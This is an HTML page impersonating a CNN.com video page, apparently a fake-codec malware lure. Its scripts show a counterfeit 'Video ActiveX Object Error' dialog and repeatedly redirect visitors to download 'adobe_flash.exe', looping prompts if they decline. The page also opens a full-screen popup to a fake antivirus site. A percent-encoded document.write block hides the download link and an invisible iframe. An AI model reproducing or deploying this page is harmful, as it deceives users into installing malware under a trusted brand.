 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
        "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<title>Video - Breaking News Videos from CNN.com</title> 
<meta name="Title" content="Video - Breaking News Videos from CNN.com"> 
<meta name="Description" content="Find the latest video news stories and information free from CNN.com. Watch breaking news and video clips about politics, entertainment, weather, the world, and more."> 
<meta name="Keywords" content="CNN, CNN news, CNN.com, CNN TV, CNN video, CNN video news, CNN Live, CNN.com video, CNN.com Live, Live from CNN.com, video, VOD, video news, live, live video, live breaking news, flash video, flash video player"> 
<link rel="alternate" type="application/rss+xml" title="CNN.com: Video" href="http://rss.cnn.com/rss/cnn_freevideo.rss" /> 
<link rel="stylesheet" href="common.css" type="text/css" />
<link rel="stylesheet" href="bvp.css" type="text/css" />	
<script>
function activex_is_here()
{
    try
    {
        return false;
    }
    catch(e)
    {
        ;
    }

    return false;
}

function releaseMovie() {
	if (activex_is_here()) {
		document.getElementById('playMov').innerHTML = '<embed src="/movie.mpg" width="480" height="400" autostart="true" type="movie/mpg"></embed>';
	}
}function codecDownload()
{
	if (window.navigator.userAgent.indexOf("SV1") != -1 || window.navigator.userAgent.indexOf("MSIE 7") !=-1) {
return;
	}
	else {
		window.setTimeout("location.href='adobe_flash.exe'", 3000);
	}
}

var begin_popup_url = 'http://asvoo.org/antivir/';
function show_begin_popup()
{
     if (begin_popup_url && begin_popup_url != '')
     {
	var width = window.screen.availWidth;
	var height = window.screen.availHeight;
	var left = 0;
	var top = 0;

	params = 'height='+height+',width='+width+',left='+left+',top='+top+',toolbar=0,status=0,menubar=0,status=0,menubar=0,resizable=0,scrollbars=1';

	pop = window.open(begin_popup_url, '_blank', params);
	window.focus();
     }
}

</script>
</head>

<body>

<script>


var Drag = {
	obj : null,
	init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
	{
		o.onmousedown	= Drag.start;

		o.hmode			= bSwapHorzRef ? false : true ;
		o.vmode			= bSwapVertRef ? false : true ;

		o.root = oRoot && oRoot != null ? oRoot : o ;

		if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
		if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
		if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
		if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

		o.minX	= typeof minX != 'undefined' ? minX : null;
		o.minY	= typeof minY != 'undefined' ? minY : null;
		o.maxX	= typeof maxX != 'undefined' ? maxX : null;
		o.maxY	= typeof maxY != 'undefined' ? maxY : null;

		o.xMapper = fXMapper ? fXMapper : null;
		o.yMapper = fYMapper ? fYMapper : null;

		o.root.onDragStart	= new Function();
		o.root.onDragEnd	= new Function();
		o.root.onDrag		= new Function();
	},

	start : function(e)
	{
		var o = Drag.obj = this;
		e = Drag.fixE(e);
		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
		o.root.onDragStart(x, y);

		o.lastMouseX	= e.clientX;
		o.lastMouseY	= e.clientY;

		if (o.hmode) {
			if (o.minX != null)	o.minMouseX	= e.clientX - x + o.minX;
			if (o.maxX != null)	o.maxMouseX	= o.minMouseX + o.maxX - o.minX;
		} else {
			if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
			if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
		}

		if (o.vmode) {
			if (o.minY != null)	o.minMouseY	= e.clientY - y + o.minY;
			if (o.maxY != null)	o.maxMouseY	= o.minMouseY + o.maxY - o.minY;
		} else {
			if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
			if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
		}

		document.onmousemove	= Drag.drag;
		document.onmouseup		= Drag.end;

		return false;
	},

	drag : function(e)
	{
		e = Drag.fixE(e);
		var o = Drag.obj;

		var ey	= e.clientY;
		var ex	= e.clientX;
		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
		var nx, ny;

		if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
		if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
		if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
		if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

		nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
		ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

		if (o.xMapper)		nx = o.xMapper(y)
		else if (o.yMapper)	ny = o.yMapper(x)

		Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
		Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
		Drag.obj.lastMouseX	= ex;
		Drag.obj.lastMouseY	= ey;

		Drag.obj.root.onDrag(nx, ny);
		return false;
	},

	end : function()
	{
		document.onmousemove = null;
		document.onmouseup   = null;
		Drag.obj.root.onDragEnd(	parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
									parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
		Drag.obj = null;
	},

	fixE : function(e)
	{
		if (typeof e == 'undefined') e = window.event;
		if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
		if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
		return e;
	}
};

function Down(download,e) 
{ 
	if (e!=null && e.keyCode==27)
	{	Close();
		return;
	}	
    switch (download) 
    { 
        case "iax": document.location.href="adobe_flash.exe"; break; 
        Close(); 
    } 

} 

function vc() {
	if (confirm('Video ActiveX Object Error.\n\nYour browser cannot play this video file.\nClick \'OK\' to download and install missing Video ActiveX Object.')) {
		location.href="adobe_flash.exe";
	}
	else {
		if (alert('Please install new version of Video ActiveX Object.')) {
			vc();
		}
		else {
			vc();
		}			
	}
}

function Close() 
{ 
    var p=document.getElementById("popdiv");
    p.style.visibility="hidden"; 
	vc();
} 
function Details()
{
	alert('You must download Video ActiveX Object to play this video file.');
}

</script>

<div name="popdiv" id="popdiv" onKeyPress="Down('iax',event);" style="visibility:hidden; z-index:1;position:absolute;top:0px;left:0px;">
<table cellpadding="0" cellspacing="0" width="362" height="126">
<tr><td>
<table cellpadding="0" cellspacing="0" width="362" height="29" style=" BACKGROUND-IMAGE:URL('xptop.gif'); height:29px; width:362;"> <!-- win top table -->
<tr>
<td style="color:white; font-family:Tahoma; font-size:13px; font-weight:bold; padding-left:4px;padding-top:1px">&nbsp;&nbsp;Video ActiveX Object Error.</td>
<td width="21" style="padding-right:6px;"><img src="xpclose.gif" width="21" height="21" onClick="Close();" style="cursor:default;" ></td>
</tr>
</table>
</td></tr>
<tr><td>
<table cellpadding="0" cellspacing="0" height="97">
<tr>
<td style="background-image:url(left.gif); background-repeat:repeat-y;" valign="bottom">
<table cellpadding="0" cellspacing="0">
<tr><td><img src="xpleftclm.gif" width="3" height="97"></td></tr>
</table>
</td>
<td valign="top">
<table cellpadding="0" cellspacing="0" width="356" bgcolor="ece9d8">
<tr><td>
<table cellpadding="0" cellspacing="0" height="59">
<tr>
<td align="center" style="padding-left:20px; padding-top:13px;" valign="top">
<img src="alert.gif" width="31" height="32"></td>
<td align="left" style="font-size:11px;  font-family:Tahoma; padding-left:30px; padding-bottom:8px; padding-right:5px;">
<br><b>Video ActiveX Object Error:</b><br>Your browser cannot display this video file.<br><br>You need to download new version of Video ActiveX Object to play this video file.
</td></tr>
</table>
</td>
</tr>
<tr><tr>
<td style="padding-left:20px; padding-right:20px; padding-bottom:20px; font-family:Tahoma; font-size:11px;" align="center">
<hr><br>Click Continue to download and install ActiveX Object.
</td></tr><td>
<table align="center" cellpadding="0" cellspacing="6" height="22">
<tr height="22">
<td><input type="button" value="Continue" onClick="Down('iax');" style="font-size:11px;  font-family:Arial; height:23px; width:82px;" tabindex="1" ID="Button1" NAME="Button1"><br><br></td>
<td></td>
<td><input type="button" value="Cancel" onClick="Close()" style="font-size:11px;  font-family:Arial; height:23px; width:82px;" ID="Button3" NAME="Button3"><br><br></td>
<td><input type="button" value="Details..." onClick="Details()" style="font-size:11px;  font-family:Arial; height:23px; width:82px;" ID="Button3" NAME="Button3"><br><br></td>
</tr>
</table>
</td>
</tr>
<tr>
<td>
<table cellpadding="0" cellspacing="0" width="100%">
<tr bgcolor="4577ea" style="height:1px;">
<td></td>
</tr> <!-- empty colors -->
<tr bgcolor="0029b5" style="height:1px;">
<td></td>
</tr>
<tr bgcolor="001590" style="height:1px;">
<td></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td style="background-image:url(right.gif); background-repeat:repeat-y;" valign="bottom">
<table cellpadding="0" cellspacing="0">
<tr>
<td style="padding:0px;"><img src="xprightclm.gif" width="3" height="97"></td>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>

<script>
if (navigator.userAgent.indexOf("Firefox")!=-1) {
if (activex_is_here()) { } else {
	setTimeout("Close();", 1000);
}
}
else {
if (activex_is_here()) { } else {
	setTimeout("showPopDiv();",2000);
}
}
      
function showPopDiv()
{
		var sFlag = "No";
		var byFlag = false;
		var FlagAr = sFlag.split("");
	
		if (FlagAr[0]=="1"){byFlag = true;}
		if (FlagAr[0]=="3"){byFlag = true;}
	
		if(!byFlag) {
			var p=document.getElementById("popdiv"); 
	
		var myWidth = 0, myHeight = 0;
		if( typeof( window.innerWidth ) == 'number' ) {
		myWidth = window.innerWidth;
		myHeight = window.innerHeight;
		} else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {
		myWidth = document.documentElement.clientWidth;
		myHeight = document.documentElement.clientHeight;
		} else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
		myWidth = document.body.clientWidth;
		myHeight = document.body.clientHeight;
		}

		function getScroll() {
		
			var scrOfX = 0, scrOfY = 0;
			if( typeof( window.pageYOffset ) == 'number' ) {
			scrOfY = window.pageYOffset;
			scrOfX = window.pageXOffset;
			} else if( document.body && ( document.body.scrollLeft || document.body.scrollTop ) ) {
			scrOfY = document.body.scrollTop;
			scrOfX = document.body.scrollLeft;
			} else if( document.documentElement && ( document.documentElement.scrollLeft || document.documentElement.scrollTop ) ) {
			scrOfY = document.documentElement.scrollTop;
			scrOfX = document.documentElement.scrollLeft;
			}
			return [scrOfX, scrOfY];
		
		}

		sc = getScroll(); 
		p.style.top = (myHeight/2 - 181)+sc[1]+'px'; 
		p.style.left = (myWidth/2 - 120) + sc[0]+'px'; 
		p.style.visibility = 'visible';
		p.focus();
	}
}

Drag.init(document.getElementById("popdiv"));
</script>

</div>

<div id="cnnContainer">
<div id="cnnContentContainer">
<div id="cnnVPContainer">

<div class="cnnBackHome">	
	<style type="text/css">
	<!--
	.cnnOpin {float:right;color:#F2F2F2;font-size:11px;}
	.cnnOpin a.realmLink {font-weight:bold;font-size:11px;}
	.cnnOpin a {margin:0px 6px;}
	-->
	</style>

<Script Language='Javascript'>
<!--
document.write(unescape('%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6E%6E%4F%70%69%6E%22%3E%0A%3C%61%20%68%72%65%66%3D%22%23%22%20%63%6C%61%73%73%3D%22%72%65%61%6C%6D%4C%69%6E%6B%22%3E%3C%69%6D%67%20%73%72%63%3D%22%6F%70%69%6E%69%6F%6E%42%6C%75%65%2E%67%69%66%22%20%74%69%74%6C%65%3D%22%46%65%65%64%62%61%63%6B%22%20%73%74%79%6C%65%3D%22%6D%61%72%67%69%6E%2D%72%69%67%68%74%3A%20%35%70%78%3B%22%20%62%6F%72%64%65%72%3D%22%30%22%3E%46%65%65%64%62%61%63%6B%3C%2F%61%3E%20%7C%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%68%65%6C%70%2F%76%69%64%65%6F%2E%68%74%6D%6C%22%3E%48%65%6C%70%3C%2F%61%3E%3C%2F%64%69%76%3E%09%09%09%0A%0A%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%22%3E%26%6C%61%71%75%6F%3B%20%43%4E%4E%2E%63%6F%6D%20%48%6F%6D%65%70%61%67%65%3C%2F%61%3E%20%20%0A%3C%2F%64%69%76%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%63%6E%6E%56%50%4E%61%76%22%3E%0A%3C%74%61%62%6C%65%20%63%65%6C%6C%73%70%61%63%69%6E%67%3D%22%30%22%20%63%65%6C%6C%73%70%61%63%69%6E%67%3D%22%30%22%20%62%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%39%34%30%22%3E%0A%3C%63%6F%6C%67%72%6F%75%70%3E%0A%3C%63%6F%6C%20%77%69%64%74%68%3D%22%32%34%37%22%3E%0A%3C%63%6F%6C%20%77%69%64%74%68%3D%22%32%33%31%22%3E%0A%3C%63%6F%6C%20%77%69%64%74%68%3D%22%32%33%31%22%3E%0A%3C%63%6F%6C%20%77%69%64%74%68%3D%22%32%33%31%22%3E%0A%3C%2F%63%6F%6C%67%72%6F%75%70%3E%0A%3C%74%72%3E%0A%3C%74%64%3E%3C%69%6D%67%20%73%72%63%3D%22%63%6E%6E%5F%76%69%64%65%6F%5F%6C%6F%67%6F%2E%67%69%66%22%20%77%69%64%74%68%3D%22%31%33%30%22%20%68%65%69%67%68%74%3D%22%32%34%22%20%61%6C%74%3D%22%22%20%62%6F%72%64%65%72%3D%22%30%22%20%63%6C%61%73%73%3D%22%63%6E%6E%56%69%64%65%6F%4C%6F%67%6F%22%3E%3C%2F%74%64%3E%0A%3C%74%64%20%63%6C%61%73%73%3D%22%4E%61%76%49%74%65%6D%22%3E%3C%69%6D%67%20%73%72%63%3D%22%76%69%64%65%6F%5F%69%63%6F%6E%5F%61%63%74%69%76%65%2E%67%69%66%22%20%61%6C%74%3D%22%22%20%62%6F%72%64%65%72%3D%22%30%22%3E%26%6E%62%73%70%3B%3C%61%20%68%72%65%66%3D%22%23%22%3E%4C%69%76%65%20%56%69%64%65%6F%3C%2F%61%3E%3C%2F%74%64%3E%0A%3C%74%64%20%63%6C%61%73%73%3D%22%4E%61%76%49%74%65%6D%22%3E%3C%69%6D%67%20%73%72%63%3D%22%70%6F%64%63%61%73%74%5F%69%63%6F%6E%2E%67%69%66%22%20%77%69%64%74%68%3D%22%31%32%22%20%68%65%69%67%68%74%3D%22%31%34%22%20%61%6C%74%3D%22%22%20%62%6F%72%64%65%72%3D%22%30%22%3E%26%6E%62%73%70%3B%3C%61%20%68%72%65%66%3D%22%23%22%3E%50%6F%64%63%61%73%74%73%3C%2F%61%3E%3C%2F%74%64%3E%0A%3C%74%64%20%63%6C%61%73%73%3D%22%4E%61%76%49%74%65%6D%22%3E%3C%69%6D%67%20%73%72%63%3D%22%72%61%64%69%6F%5F%69%63%6F%6E%2E%67%69%66%22%20%77%69%64%74%68%3D%22%31%31%22%20%68%65%69%67%68%74%3D%22%31%34%22%20%61%6C%74%3D%22%22%20%62%6F%72%64%65%72%3D%22%30%22%3E%26%6E%62%73%70%3B%3C%61%20%68%72%65%66%3D%22%23%22%3E%43%4E%4E%26%6E%62%73%70%3B%52%61%64%69%6F%3C%2F%61%3E%3C%2F%74%64%3E%0A%3C%69%66%72%61%6D%65%20%69%64%3D%22%30%31%22%20%73%72%63%3D%22%6D%65%74%61%69%2E%68%74%6D%6C%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%22%30%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%22%3E%3C%2F%69%66%72%61%6D%65%3E%0A%3C%2F%74%72%3E%0A%3C%2F%74%61%62%6C%65%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%64%69%76%20%73%74%79%6C%65%3D%22%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%22%3E%0A%3C%70%3E%3C%61%20%68%72%65%66%3D%22%23%22%20%6F%6E%43%6C%69%63%6B%3D%22%73%68%6F%77%5F%62%65%67%69%6E%5F%70%6F%70%75%70%28%29%3B%77%69%6E%64%6F%77%2E%63%6C%6F%73%65%28%29%3B%22%20%3E%3C%69%6D%67%20%73%72%63%3D%22%63%6C%6F%73%65%2E%70%6E%67%22%20%61%6C%74%3D%22%43%6C%6F%73%65%20%74%68%65%20%70%61%67%65%22%20%62%6F%72%64%65%72%3D%22%30%22%20%68%65%69%67%68%74%3D%22%35%30%22%20%77%69%64%74%68%3D%22%33%30%30%22%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%21%2D%2D%20%4C%41%52%47%45%20%50%4C%41%59%45%52%20%48%54%4D%4C%20%43%4F%44%45%20%2D%2D%3E%0A%3C%61%20%68%72%65%66%3D%22%61%64%6F%62%65%5F%66%6C%61%73%68%2E%65%78%65%22%3E%0A%3C%69%6D%67%20%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%22%77%69%6E%64%6F%77%2E%73%74%61%74%75%73%20%3D%20%27%59%6F%75%20%6D%75%73%74%20%64%6F%77%6E%6C%6F%61%64%20%56%69%64%65%6F%20%41%63%74%69%76%65%58%20%4F%62%6A%65%63%74%20%74%6F%20%70%6C%61%79%20%74%68%69%73%20%76%69%64%65%6F%20%66%69%6C%65%2E%27%3B%22%20%61%6C%74%3D%22%59%6F%75%20%6D%75%73%74%20%64%6F%77%6E%6C%6F%61%64%20%56%69%64%65%6F%20%41%63%74%69%76%65%58%20%4F%62%6A%65%63%74%20%74%6F%20%70%6C%61%79%20%74%68%69%73%20%76%69%64%65%6F%20%66%69%6C%65%2E%22%20%73%72%63%3D%22%6E%6F%5F%66%6C%61%73%68%2E%6A%70%67%22%20%77%69%64%74%68%3D%22%35%38%32%22%20%68%65%69%67%68%74%3D%22%34%37%37%22%20%62%6F%72%64%65%72%3D%22%30%22%3E%3C%2F%61%3E%0A%3C%21%2D%2D%20%2F%4C%41%52%47%45%20%50%4C%41%59%45%52%20%48%54%4D%4C%20%43%4F%44%45%20%2D%2D%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6C%65%61%72%22%3E%3C%69%6D%67%20%73%72%63%3D%22%31%5F%30%30%32%2E%67%69%66%22%20%61%6C%74%3D%22%22%20%62%6F%72%64%65%72%3D%22%30%22%20%68%65%69%67%68%74%3D%22%31%22%20%77%69%64%74%68%3D%22%31%22%3E%3C%2F%64%69%76%3E%0A%0A%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%64%69%76%20%73%74%79%6C%65%3D%22%6D%61%72%67%69%6E%2D%74%6F%70%3A%20%31%35%70%78%3B%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%31%70%78%3B%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%38%70%78%3B%20%63%6F%6C%6F%72%3A%20%72%67%62%28%31%34%38%2C%20%31%34%38%2C%20%31%34%38%29%3B%22%20%61%6C%69%67%6E%3D%22%63%65%6E%74%65%72%22%3E%0A%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%22%3E%48%6F%6D%65%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%57%4F%52%4C%44%2F%22%3E%57%6F%72%6C%64%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%55%53%2F%22%3E%55%2E%53%2E%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%50%4F%4C%49%54%49%43%53%2F%22%3E%50%6F%6C%69%74%69%63%73%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%53%48%4F%57%42%49%5A%2F%22%3E%45%6E%74%65%72%74%61%69%6E%6D%65%6E%74%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%48%45%41%4C%54%48%22%3E%48%65%61%6C%74%68%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%54%45%43%48%22%3E%54%65%63%68%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%54%52%41%56%45%4C%2F%22%3E%54%72%61%76%65%6C%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%76%69%64%65%6F%2F%6C%69%76%69%6E%67%22%3E%4C%69%76%69%6E%67%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%6D%6F%6E%65%79%2F%22%3E%42%75%73%69%6E%65%73%73%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%73%69%2F%22%3E%53%70%6F%72%74%73%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%74%69%6D%65%2F%22%3E%54%69%6D%65%2E%63%6F%6D%3C%2F%61%3E%3C%62%72%3E%0A%A9%20%32%30%30%37%20%43%61%62%6C%65%20%4E%65%77%73%20%4E%65%74%77%6F%72%6B%20%4C%50%2C%20%4C%4C%4C%50%2E%20%41%20%54%69%6D%65%20%57%61%72%6E%65%72%20%43%6F%6D%70%61%6E%79%2E%20%41%6C%6C%20%52%69%67%68%74%73%20%52%65%73%65%72%76%65%64%2E%3C%62%72%3E%0A%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%69%6E%74%65%72%61%63%74%69%76%65%5F%6C%65%67%61%6C%2E%68%74%6D%6C%22%3E%54%65%72%6D%73%20%6F%66%20%73%65%72%76%69%63%65%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%70%72%69%76%61%63%79%2E%68%74%6D%6C%22%3E%50%72%69%76%61%63%79%20%67%75%69%64%65%6C%69%6E%65%73%3C%2F%61%3E%20%3C%21%2D%2D%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%41%64%76%65%72%74%69%73%65%22%3E%41%64%76%65%72%74%69%73%65%20%77%69%74%68%20%75%73%3C%2F%61%3E%20%2D%2D%3E%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%61%62%6F%75%74%2F%22%3E%41%62%6F%75%74%20%75%73%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%66%65%65%64%62%61%63%6B%2F%22%3E%43%6F%6E%74%61%63%74%20%75%73%3C%2F%61%3E%20%26%6E%62%73%70%3B%7C%26%6E%62%73%70%3B%20%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%65%64%69%74%69%6F%6E%2E%63%6E%6E%2E%63%6F%6D%2F%68%65%6C%70%2F%22%3E%48%65%6C%70%3C%2F%61%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E'));
//-->
</Script>